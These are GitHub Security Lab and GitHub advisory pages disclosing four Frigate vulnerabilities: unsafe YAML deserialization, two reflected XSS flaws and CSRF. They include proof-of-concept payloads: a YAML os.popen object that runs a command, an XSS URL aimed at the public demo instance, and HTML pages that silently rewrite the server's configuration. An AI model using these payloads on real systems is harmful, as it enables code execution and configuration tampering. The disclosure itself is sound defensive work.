=== Content from securitylab.github.com_c078a96a_20250114_190143.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

December 12, 2023
# GHSL-2023-190: Several vulnerabilities in Frigate - CVE-2023-45672, CVE-2023-45671, CVE-2023-45670

[![Author avatar](https://avatars.githubusercontent.com/u/61799930)
Logan MacLaren](https://github.com/ghsecuritylab)

## Coordinated Disclosure Timeline

* 2023-10-04: Report sent to blakeb@blakeshome.com
* 2023-10-07: Maintainer acknowledges the report
* 2023-10-10: Created reports through Private Vulnerability Reporting: [GHSA-qp3h-4q62-p428](https://github.com/blakeblackshear/frigate/security/advisories/GHSA-qp3h-4q62-p428), [GHSA-jjxc-m35j-p56f](https://github.com/blakeblackshear/frigate/security/advisories/GHSA-jjxc-m35j-p56f), [GHSA-xq49-hv88-jr6h](https://github.com/blakeblackshear/frigate/security/advisories/GHSA-xq49-hv88-jr6h)
* 2023-10-28: Reports are published

## Summary

* ### Unsafe deserialization in `load_config_with_no_duplicates` of `frigate/util/builtin.py` (`GHSL-2023-190`)

  + An unsafe deserialization vulnerability was identified in the endpoints used to save configurations for Frigate. This can lead to unauthenticated remote code execution. This can be performed through the UI at `/config` or through a direct call to `/api/config/save`.
* ### Reflected XSS through `/<camera_name>` API endpoints (`GHSL-2023-195`)

  + There is a reflected XSS vulnerability in any API endpoints reliant on the `/<camera_name>` base path as values provided for the path are not sanitized.
* ### Cross-site request forgery vulnerability in `config_save` and `config_set` request handlers (`GHSL-2023-198`)

  + The [`config/save`](https://github.com/blakeblackshear/frigate/blob/6aedc39a9a421cf48000a727f36b4c1495848a1d/frigate/http.py#L998) and [`config/set`](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py#L1060) endpoints of Frigate do not implement any CSRF protection. This makes it possible for a request sourced from another site to update the configuration of the Frigate server (e.g. via “[“drive-by” attack](https://about.gitlab.com/blog/2021/09/07/why-are-developers-vulnerable-to-driveby-attacks/)).
* ### Cross-site scripting in `/logs/<service>` endpoint (`GHSL-2023-209`)

  + The `logs/<service>` endpoint permits a user to retrieve logs from specified services (nginx, go2rtc, frigate), however if the user specifies a service that is not in that list this endpoint *should* return an error stating that the service is unavailable. The returned data is the default content-type of `text/html` and is unsanitized. As such, this permits the injection of javascript payloads.

    - Please note that this is not currently exploitable due to a [separate bug](https://github.com/blakeblackshear/frigate/blob/ead03c381b70fab1db7f6dd3952d6e8ea1217417/frigate/http.py#L1814), however if/when that is resolved it will permit this XSS vulnerability to be exploited. The bug preventing this can be found in the `if` statement that [wraps this error message](https://github.com/blakeblackshear/frigate/blob/ead03c381b70fab1db7f6dd3952d6e8ea1217417/frigate/http.py#L1814). This should presumable read `if not service_location` or `if service not in log_locations`.

## Project

Frigate

## Tested Version

* [v0.12.1](https://github.com/blakeblackshear/frigate/releases/tag/v0.12.1)
* [v0.13.0 Beta 1](https://github.com/blakeblackshear/frigate/releases/tag/v0.13.0-beta1)

## Details

### Issue 1: Unsafe deserialization in `load_config_with_no_duplicates` of `frigate/util/builtin.py` (`GHSL-2023-190`)

Input is initially accepted through `http.py` at [frigate/http.py:998](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py#L998-L998):

```
@bp.route("/config/save", methods=["POST"])
def config_save():
    save_option = request.args.get("save_option")

    new_config = request.get_data().decode()

```

The user-provided input is then parsed and loaded by `load_config_with_no_duplicates` at [frigate/config.py:1244](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/config.py#L1244-L1244):

```
@classmethod
def parse_raw(cls, raw_config):
    config = load_config_with_no_duplicates(raw_config)
    return cls.parse_obj(config)

```

However, `load_config_with_no_duplicates` uses `yaml.loader.Loader` which can instantiate custom constructors. A provided payload will be executed directly at [frigate/util/builtin.py:110](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/util/builtin.py#L110-L110):

```
PreserveDuplicatesLoader.add_constructor(
    yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG, map_constructor
)
return yaml.load(raw_config, PreserveDuplicatesLoader)

```

This vulnerability was found using CodeQL’s [Deserialization of user-controlled data query](https://codeql.github.com/codeql-query-help/python/py-unsafe-deserialization/) for Python.

#### Impact

This issue may lead to pre-authenticated Remote Code Execution.

#### Proof of Concept:

1. Start Frigate in [Docker](https://docs.frigate.video/frigate/installation/#docker) for ease of setup.
2. Navigate to `localhost:5000/config`.
3. Enter the following content into the config, and save the configuration:

```
!!python/object/apply:os.popen
- touch /tmp/pwned

```

1. Note that `/tmp/pwned` is created in the container. This access can also be extended to write to mounted filesystems if not mounted as read-only.

#### Resources

* [CodeQL for Python: Unsafe Deserialization](https://codeql.github.com/codeql-query-help/python/py-unsafe-deserialization/)
* [Python Yaml Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization#rce)

### Issue 2: Reflected XSS through `/<camera_name>` API endpoints (`GHSL-2023-195`)

The [`recording_clip` request handler](https://github.com/blakeblackshear/frigate/blob/9185753322cc594b99509e9234c60647e70fae6f/frigate/http.py#L1426C14-L1426C14) returns an unescaped/unsanitized string based on the `camera_name` requested in the route that calls it. As a result of this, reflected XSS is possible.

By calling a camera that does not exist, we can force a failure response that will return the requested value. Note that this is response will use [Flask’s default `content-type` of `text/html`](https://flask.palletsprojects.com/en/2.3.x/quickstart/#about-responses):

```
if p.returncode != 0:
  logger.error(p.stderr)
  return f"Could not create clip from recordings for {camera_name}.", 500

```

As an example, we can trigger an XSS payload using the [official demo instance](https://demo.frigate.video) with the following `GET` request executed in a browser:

```
GET https://demo.frigate.video/api/%3Cimg%20src=%22%22%20onerror=alert(document.domain)%3E

```

This vulnerability was found using CodeQL’s [Reflected server-side cross-site scripting](https://codeql.github.com/codeql-query-help/python/py-reflective-xss/) for Python.

#### Impact

As the reflected values included in the URL are not sanitized or escaped, this permits execution arbitrary Javascript payloads.

#### Resources

* Python Library Reference: [html.escape()](https://docs.python.org/3/library/html.html#html.escape).
* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).

### Issue 3: Cross-site request forgery vulnerability in `config_save` and `config_set` request handlers (`GHSL-2023-198`)

When provided with a `POST` request containing the `save_option` parameter, the [`config_save` request handler](https://github.com/blakeblackshear/frigate/blob/367d7244d37f4e48ce1760b319c0fe141ab58711/frigate/http.py#L751) will attempt to write the user-supplied configuration in the request body to the configuration file on disk. Similarly, when provided with a `PUT` request the [`config_set` request handler](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py#L1060) will attempt to update the existing configuration file with the user-supplied values specified as variables in the URL.

As these endpoints do not have any CSRF protection or authentication requirement this permits a request from any origin (e.g. a [“drive-by” attack](https://about.gitlab.com/blog/2021/09/07/why-are-developers-vulnerable-to-driveby-attacks/)) to update the configuration of the Frigate server.

##### Proof of Concept

1. Start Frigate following the [Docker instructions](https://docs.frigate.video/frigate/installation#docker) using the [example `config.yml` file](https://github.com/blakeblackshear/frigate/blob/v0.12.1/config/config.yml.example).
2. Host an HTML file with the following contents anywhere accessible from your local machine:

```
<html>
<script>
function pwnd()
{
        let xhr = new XMLHttpRequest();
        xhr.open("POST", "http://<FRIGATE_SERVER>:5000/api/config/save?save_option=saveonly");

        xhr.onreadystatechange = function () {
                  if (xhr.readyState === 4) {
                              console.log(xhr.status);
                              console.log(xhr.responseText);
                            }};
let data = `mqtt:
  host: mqtt

cameras:
  pwnd:
    ffmpeg:
      inputs:
        - path: /media/frigate/car-stopping.mp4
          input_args: -re -stream_loop -1 -fflags +genpts
          roles:
            - detect
            - rtmp
    detect:
      height: 1080
      width: 1920
      fps: 5`;

        xhr.send(data);
        console.log("pwnd");
}

pwnd();
</script>
</html>

```

1. Access the new page (e.g. `http://<YOUR_WEB_SERVER_HOST>/poc.html`).
2. Note that the configuration of the Frigate service has been updated to now have a camera named `pwnd` instead of `test`.

This can also be performed against the `config/set` endpoint with the same setup outlined above, but the following `poc.html` which will update the `mqtt.host` value to `pwnd`:

```
<html>
<script>
        function pwn() {
        let xhr = new XMLHttpRequest();
        xhr.open("PUT", "http://<FRIGATE_SERVER>:5000/api/config/set?mqtt.host=pwnd");

        xhr.onreadystatechange = function () {
                  if (xhr.readyState === 4) {
                              console.log(xhr.status);
                              console.log(xhr.responseText);
                            }};

        xhr.send();
        }
pwn();
</script>
</html>

```

This demonstrates that requests from any origin can result in arbitrary writes to Frigate’s configuration.

#### Impact

This issue can lead to arbitrary configuration updates for the Frigate server, resulting in denial of service and possible data exfiltration.

#### Resources

* [OWASP Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern)

### Issue 4: Cross-site scripting in `/logs/<service>` endpoint (`GHSL-2023-209`)

The following error message is returned with a content type of `text/html` and the values are fully user controlled and unsanitized.

```
return f"{service} is not a valid service", 404

```

This permits an attacker to craft a URL to a service that is not in [the valid `log_locations`](https://github.com/blakeblackshear/frigate/blob/ead03c381b70fab1db7f6dd3952d6e8ea1217417/frigate/http.py#L1807) and that instead contains a javascript payload for XSS purposes.

This was identified with CodeQL’s [Reflected server-side cross-site scripting](https://codeql.github.com/codeql-query-help/python/py-reflective-xss/#reflected-server-side-cross-site-scripting) query.

#### Impact

As the reflected values included in the URL are not sanitized or escaped, this permits execution arbitrary Javascript payloads.

#### Resources

* Python Library Reference: [html.escape()](https://docs.python.org/3/library/html.html#html.escape).
* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).

## CVE

* CVE-2023-45672
* CVE-2023-45671
* CVE-2023-45670

## Credit

This issue was discovered and reported by GHSL team members [@maclarel (Logan MacLaren)](https://github.com/maclarel) and [@jorgectf (Jorge Rosillo)](https://github.com/jorgectf).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-190`, `GHSL-2023-195`, `GHSL-2023-198`, or `GHSL-2023-209` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from github.com_15607330_20250114_190143.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fsecurity%2Fadvisories%2FGHSA-jjxc-m35j-p56f)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fsecurity%2Fadvisories%2FGHSA-jjxc-m35j-p56f)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=blakeblackshear%2Ffrigate)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[blakeblackshear](/blakeblackshear)
/
**[frigate](/blakeblackshear/frigate)**
Public

* [Notifications](/login?return_to=%2Fblakeblackshear%2Ffrigate) You must be signed in to change notification settings
* [Fork
  1.9k](/login?return_to=%2Fblakeblackshear%2Ffrigate)
* [Star
   20.3k](/login?return_to=%2Fblakeblackshear%2Ffrigate)

* [Code](/blakeblackshear/frigate)
* [Issues
  116](/blakeblackshear/frigate/issues)
* [Pull requests
  47](/blakeblackshear/frigate/pulls)
* [Discussions](/blakeblackshear/frigate/discussions)
* [Actions](/blakeblackshear/frigate/actions)
* [Projects
  0](/blakeblackshear/frigate/projects)
* [Security](/blakeblackshear/frigate/security)
* [Insights](/blakeblackshear/frigate/pulse)

Additional navigation options

* [Code](/blakeblackshear/frigate)
* [Issues](/blakeblackshear/frigate/issues)
* [Pull requests](/blakeblackshear/frigate/pulls)
* [Discussions](/blakeblackshear/frigate/discussions)
* [Actions](/blakeblackshear/frigate/actions)
* [Projects](/blakeblackshear/frigate/projects)
* [Security](/blakeblackshear/frigate/security)
* [Insights](/blakeblackshear/frigate/pulse)

# Reflected XSS through `/<camera\_name>` API endpoints (GHSL-2023-195)

Moderate

[blakeblackshear](/blakeblackshear)
published
GHSA-jjxc-m35j-p56f
Oct 28, 2023

## Package

No package listed

## Affected versions

<= v0.12.1, < v0.13.0 Beta 3

## Patched versions

v0.13.0 Beta 3

## Description

## Summary

There is a reflected XSS vulnerability in any API endpoints reliant on the `/<camera_name>` base path as values provided for the path are not sanitized.

Exploiting this vulnerability requires the attacker to both know very specific information about a user's Frigate server and requires an authenticated user to be tricked into clicking a specially crafted link to their Frigate instance.

This vulnerability could exploited by an attacker under the following circumstances:

1. Frigate publicly exposed to the internet (even with authentication)
2. Attacker knows the address of a user's Frigate instance
3. Attacker crafts a specialized page which links to the user's Frigate instance
4. Attacker finds a way to get an authenticated user to visit their specialized page and click the button/link

## Details

The [`recording_clip` request handler](https://github.com/blakeblackshear/frigate/blob/9185753322cc594b99509e9234c60647e70fae6f/frigate/http.py#L1426C14-L1426C14) returns an unescaped/unsanitized string based on the `camera_name` requested in the route that calls it. As a result of this, reflected XSS is possible.

By calling a camera that does not exist, we can force a failure response that will return the requested value. Note that this is response will use [Flask's default `content-type` of `text/html`](https://flask.palletsprojects.com/en/2.3.x/quickstart/#about-responses):

```
if p.returncode != 0:
  logger.error(p.stderr)
  return f"Could not create clip from recordings for {camera_name}.", 500
```

As an example, we can trigger an XSS payload using the [official demo instance](https://demo.frigate.video) with the following `GET` request executed in a browser:

```
GET https://demo.frigate.video/api/%3Cimg%20src=%22%22%20onerror=alert(document.domain)%3E

```

This vulnerability was found using CodeQL’s [Reflected server-side cross-site scripting](https://codeql.github.com/codeql-query-help/python/py-reflective-xss/) for Python.

#### Impact

As the reflected values included in the URL are not sanitized or escaped, this permits execution arbitrary Javascript payloads.

### Severity

Moderate

### CVE ID

CVE-2023-45671

### Weaknesses

[CWE-79](/advisories?query=cwe%3A79)

### Credits

* [![@jorgectf](https://avatars.githubusercontent.com/u/46056498?s=40&v=4)](/jorgectf)
  [jorgectf](/jorgectf)
  Reporter
* [![@maclarel](https://avatars.githubusercontent.com/u/21298298?s=40&v=4)](/maclarel)
  [maclarel](/maclarel)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


